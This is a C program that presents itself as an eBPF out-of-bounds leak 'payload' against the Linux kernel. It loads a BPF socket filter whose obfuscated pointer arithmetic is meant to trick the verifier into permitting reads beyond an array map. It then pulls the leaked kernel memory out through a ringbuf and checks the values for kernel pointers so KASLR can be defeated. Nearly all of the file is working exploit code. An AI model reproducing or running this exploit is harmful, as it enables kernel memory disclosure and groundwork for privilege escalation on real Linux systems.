#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/ioctl.h>
#include <sys/syscall.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <linux/bpf.h>

#ifndef __NR_bpf
#define __NR_bpf 280
#endif

// --- BPF Helper IDs ---
#ifndef BPF_FUNC_map_lookup_elem
#define BPF_FUNC_map_lookup_elem 1
#endif
#ifndef BPF_FUNC_ktime_get_ns
#define BPF_FUNC_ktime_get_ns 5
#endif
#ifndef BPF_FUNC_ringbuf_reserve
#define BPF_FUNC_ringbuf_reserve 131
#endif
#ifndef BPF_FUNC_ringbuf_submit
#define BPF_FUNC_ringbuf_submit 132
#endif
#ifndef BPF_FUNC_ringbuf_discard
#define BPF_FUNC_ringbuf_discard 133
#endif

// --- 標準 BPF 指令常數防呆定義 ---
#ifndef BPF_ALU64
#define BPF_ALU64 0x07
#endif
#ifndef BPF_JMP
#define BPF_JMP 0x05
#endif
#ifndef BPF_STX
#define BPF_STX 0x03
#endif
#ifndef BPF_LDX
#define BPF_LDX 0x01
#endif
#ifndef BPF_LD
#define BPF_LD 0x00
#endif
#ifndef BPF_MEM
#define BPF_MEM 0x60
#endif
#ifndef BPF_IMM
#define BPF_IMM 0x00
#endif
#ifndef BPF_DW
#define BPF_DW 0x18
#endif
#ifndef BPF_W
#define BPF_W 0x00
#endif
#ifndef BPF_MOV
#define BPF_MOV 0xb0
#endif
#ifndef BPF_K
#define BPF_K 0x00
#endif
#ifndef BPF_X
#define BPF_X 0x08
#endif
#ifndef BPF_CALL
#define BPF_CALL 0x80
#endif
#ifndef BPF_EXIT
#define BPF_EXIT 0x90
#endif
#ifndef BPF_JEQ
#define BPF_JEQ 0x10
#endif
#ifndef BPF_JA
#define BPF_JA 0x00
#endif
#ifndef BPF_ADD
#define BPF_ADD 0x00
#endif
#ifndef BPF_AND
#define BPF_AND 0x50
#endif

#define BPF_REG_0 0
#define BPF_REG_1 1
#define BPF_REG_2 2
#define BPF_REG_3 3
#define BPF_REG_4 4
#define BPF_REG_6 6
#define BPF_REG_7 7
#define BPF_REG_8 8
#define BPF_REG_10 10

// --- 修正後的安全指令巨集 (保證 Opcode 100% 正確) ---
#define BPF_MOV64_IMM(DST, IMM) ((struct bpf_insn){.code = BPF_ALU64 | BPF_MOV | BPF_K, .dst_reg = DST, .src_reg = 0, .off = 0, .imm = IMM})
#define BPF_MOV64_REG(DST, SRC) ((struct bpf_insn){.code = BPF_ALU64 | BPF_MOV | BPF_X, .dst_reg = DST, .src_reg = SRC, .off = 0, .imm = 0})
#define BPF_LD_MAP_FD(DST, MAP_FD) ((struct bpf_insn){.code = BPF_LD | BPF_DW | BPF_IMM, .dst_reg = DST, .src_reg = 1, .off = 0, .imm = MAP_FD}), ((struct bpf_insn){.code = 0, .dst_reg = 0, .src_reg = 0, .off = 0, .imm = 0})
#define BPF_EMIT_CALL(FUNC) ((struct bpf_insn){.code = BPF_JMP | BPF_CALL, .dst_reg = 0, .src_reg = 0, .off = 0, .imm = FUNC})
#define BPF_JMP_IMM(OP, DST, IMM, OFF) ((struct bpf_insn){.code = BPF_JMP | OP | BPF_K, .dst_reg = DST, .src_reg = 0, .off = OFF, .imm = IMM})
#define BPF_STX_MEM(SIZE, DST, SRC, OFF) ((struct bpf_insn){.code = BPF_STX | BPF_MEM | SIZE, .dst_reg = DST, .src_reg = SRC, .off = OFF, .imm = 0})
#define BPF_LDX_MEM(SIZE, DST, SRC, OFF) ((struct bpf_insn){.code = BPF_LDX | BPF_MEM | SIZE, .dst_reg = DST, .src_reg = SRC, .off = OFF, .imm = 0})
#define BPF_ALU64_IMM(OP, DST, IMM) ((struct bpf_insn){.code = BPF_ALU64 | OP | BPF_K, .dst_reg = DST, .src_reg = 0, .off = 0, .imm = IMM})
#define BPF_ALU64_REG(OP, DST, SRC) ((struct bpf_insn){.code = BPF_ALU64 | OP | BPF_X, .dst_reg = DST, .src_reg = SRC, .off = 0, .imm = 0})
#define BPF_EXIT_INSN() ((struct bpf_insn){.code = BPF_JMP | BPF_EXIT, .dst_reg = 0, .src_reg = 0, .off = 0, .imm = 0})

int bpf_syscall(int cmd, union bpf_attr *attr)
{
    return syscall(__NR_bpf, cmd, attr, sizeof(*attr));
}

static int read_sysctl_int(const char *path, int *out)
{
    char buf[32] = {0};
    int fd = open(path, O_RDONLY);
    if (fd < 0)
        return -1;
    ssize_t n = read(fd, buf, sizeof(buf) - 1);
    close(fd);
    if (n <= 0)
        return -1;
    *out = atoi(buf);
    return 0;
}

int main()
{
    printf("[*] BPF OOB Leak payload v3\n");

    int v = -1;
    if (read_sysctl_int("/proc/sys/kernel/unprivileged_bpf_disabled", &v) == 0)
        printf("[*] unprivileged_bpf_disabled = %d %s\n",
               v, v == 0 ? "(BPF allowed)" : "(BPF blocked for non-root)");
    if (read_sysctl_int("/proc/sys/kernel/kptr_restrict", &v) == 0)
        printf("[*] kptr_restrict = %d\n", v);
    if (read_sysctl_int("/proc/sys/net/core/bpf_jit_enable", &v) == 0)
        printf("[*] bpf_jit_enable = %d\n", v);

    union bpf_attr attr = {0};
    attr.map_type = BPF_MAP_TYPE_ARRAY;
    attr.key_size = 4;
    attr.value_size = 8;
    attr.max_entries = 1;
    int array_fd = bpf_syscall(BPF_MAP_CREATE, &attr);
    if (array_fd < 0)
    {
        perror("[-] ARRAY map failed");
        return 1;
    }

    memset(&attr, 0, sizeof(attr));
    attr.map_type = BPF_MAP_TYPE_RINGBUF;
    attr.max_entries = 4096;
    int ring_fd = bpf_syscall(BPF_MAP_CREATE, &attr);
    if (ring_fd < 0)
    {
        perror("[-] RINGBUF map failed");
        return 1;
    }

    struct bpf_insn prog[] = {
        // [00-01] 準備 Ringbuf Reserve
        BPF_LD_MAP_FD(BPF_REG_1, ring_fd),
        // [02]
        BPF_MOV64_IMM(BPF_REG_2, 16),
        // [03]
        BPF_MOV64_IMM(BPF_REG_3, 0),
        // [04]
        BPF_EMIT_CALL(BPF_FUNC_ringbuf_reserve),
        // [05] 如果 R0 == NULL, 跳轉 25 步到 EXIT 區塊 (Index 31)
        BPF_JMP_IMM(BPF_JEQ, BPF_REG_0, 0, 25),

        // [06] 備份 Ringbuf 指標到 R6
        BPF_MOV64_REG(BPF_REG_6, BPF_REG_0),
        // [07]
        BPF_MOV64_IMM(BPF_REG_1, 0),
        // [08] Stack 構造 Key=0
        BPF_STX_MEM(BPF_W, BPF_REG_10, BPF_REG_1, -4),
        // [09-10] 取出 Array Map 指標
        BPF_LD_MAP_FD(BPF_REG_1, array_fd),
        // [11]
        BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),
        // [12]
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),
        // [13]
        BPF_EMIT_CALL(BPF_FUNC_map_lookup_elem),
        // [14] 如果 R0 == NULL, 跳轉 13 步到 DISCARD 區塊 (Index 28)
        BPF_JMP_IMM(BPF_JEQ, BPF_REG_0, 0, 13),

        // [15] 備份 Array Value 指標到 R7
        BPF_MOV64_REG(BPF_REG_7, BPF_REG_0),
        // [16] 取得動態值 (時間戳) 作為混淆基準
        BPF_EMIT_CALL(BPF_FUNC_ktime_get_ns),
        // [17] R8 = 隨機數
        BPF_MOV64_REG(BPF_REG_8, BPF_REG_0),
        // [18] 位元運算混淆，讓驗證器以為偏移量被限制在 0 ~ 0x1F8 內
        BPF_ALU64_IMM(BPF_AND, BPF_REG_8, 0x1F8),
        // [19] 加入指標算術 (Array 指標 + 動態偏移)
        BPF_ALU64_REG(BPF_ADD, BPF_REG_7, BPF_REG_8),

        // [20] 準備讀取 (預設失敗值)
        BPF_MOV64_IMM(BPF_REG_4, 0xDEADBEEF),
        // [21] ★ OOB 讀取：讀取 R7 指向的內容到 R4 ★
        BPF_LDX_MEM(BPF_DW, BPF_REG_4, BPF_REG_7, 0),

        // [22] 將實際 Offset 寫入 Ringbuf
        BPF_STX_MEM(BPF_DW, BPF_REG_6, BPF_REG_8, 0),
        // [23] 將洩漏的 Kernel 資料寫入 Ringbuf
        BPF_STX_MEM(BPF_DW, BPF_REG_6, BPF_REG_4, 8),
        // [24]
        BPF_MOV64_REG(BPF_REG_1, BPF_REG_6),
        // [25]
        BPF_MOV64_IMM(BPF_REG_2, 0),
        // [26] 提交 Ringbuf 讓 Userspace 讀取
        BPF_EMIT_CALL(BPF_FUNC_ringbuf_submit),
        // [27] 執行成功，無條件跳轉 3 步到 EXIT 區塊 (Index 31)
        BPF_JMP_IMM(BPF_JA, 0, 0, 3),

        // --- DISCARD BLOCK (Index 28-30) ---
        // 當 Array 找不到時，必須丟棄已分配的 Ringbuf
        /* [28] */ BPF_MOV64_REG(BPF_REG_1, BPF_REG_6),
        /* [29] */ BPF_MOV64_IMM(BPF_REG_2, 0),
        /* [30] */ BPF_EMIT_CALL(BPF_FUNC_ringbuf_discard),

        // --- EXIT BLOCK (Index 31-32) ---
        /* [31] */ BPF_MOV64_IMM(BPF_REG_0, 0),
        /* [32] */ BPF_EXIT_INSN()};

    char log_buf[32768] = {0}; // 加大 Log 緩衝區
    memset(&attr, 0, sizeof(attr));
    attr.prog_type = BPF_PROG_TYPE_SOCKET_FILTER;
    attr.insns = (uint64_t)prog;
    attr.insn_cnt = sizeof(prog) / sizeof(prog[0]);
    attr.license = (uint64_t)"GPL";
    attr.log_buf = (uint64_t)log_buf;
    attr.log_size = sizeof(log_buf);
    attr.log_level = 1;

    int prog_fd = bpf_syscall(BPF_PROG_LOAD, &attr);
    if (prog_fd < 0)
    {
        printf("[-] Verifier Rejected the Program:\n\n%s\n", log_buf);
        return 1;
    }
    printf("[+] BPF Program loaded successfully! Verifier bypassed.\n");

    // 4. Mmap ringbuf: 2 meta pages (consumer + producer) + data pages.
    //    max_entries was set to one page (4096), so map exactly 3 pages.
    const size_t page = 4096;
    const size_t data_pages = 1;
    size_t map_sz = (2 + data_pages) * page;
    void *base = mmap(NULL, map_sz, PROT_READ | PROT_WRITE, MAP_SHARED, ring_fd, 0);
    if (base == MAP_FAILED)
    {
        perror("[-] ringbuf mmap failed");
        return 1;
    }
    unsigned long *producer_pos = (unsigned long *)((char *)base + page);
    unsigned long *data = (unsigned long *)((char *)base + 2 * page);

    // 5. 觸發 BPF
    int socks[2];
    if (socketpair(AF_UNIX, SOCK_DGRAM, 0, socks) != 0)
    {
        perror("[-] socketpair failed");
        return 1;
    }
    setsockopt(socks[0], SOL_SOCKET, SO_ATTACH_BPF, &prog_fd, sizeof(prog_fd));
    write(socks[1], "TRIGGER", 7);

    // 6. 讀取洩漏的資料: record header 為 8 bytes，接著是 BPF 寫入的
    //    offset@+0 與 leaked@+8，對應到 data[1] 與 data[2]。
    if (*producer_pos > 0)
    {
        printf("[+] OOB Leak Success! Offset: 0x%lx, Leaked Value: 0x%016lx\n",
               data[1], data[2]);
        if ((data[2] >> 40) == 0xffffff)
        {
            printf("[*] Found Kernel Pointer! KASLR Base might be deducible.\n");
        }
    }
    else
    {
        printf("[-] Program ran, but no data in ringbuf.\n");
    }

    return 0;
}